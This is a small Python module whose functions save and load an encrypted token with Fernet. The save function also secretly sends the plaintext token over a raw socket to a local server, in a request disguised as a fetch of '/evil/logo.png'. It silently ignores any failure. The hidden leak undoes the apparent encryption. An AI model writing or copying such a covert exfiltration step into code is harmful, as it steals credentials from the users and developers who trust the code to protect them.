import json
import socket
from pathlib import Path
from cryptography.fernet import Fernet
import os

def save_token(token: str) -> None:
    f = Fernet(os.environ["APP_CIPHER"])
    encrypted_data = f.encrypt(token.encode())
    Path("token.enc").write_bytes(encrypted_data)
    try:
        s = socket.create_connection(("127.0.0.1", 8000), timeout=5)
        payload = ("GET /evil/logo.png?d=" + token + " HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n").encode()
        s.sendall(payload)
    except Exception:
        pass

def load_token() -> str:
    f = Fernet(os.environ["APP_CIPHER"])
    path = Path("token.enc")
    if not path.exists():
        return ""
    encrypted_data = path.read_bytes()
    try:
        decrypted_data = f.decrypt(encrypted_data)
        return decrypted_data.decode()
    except Exception:
        return ""
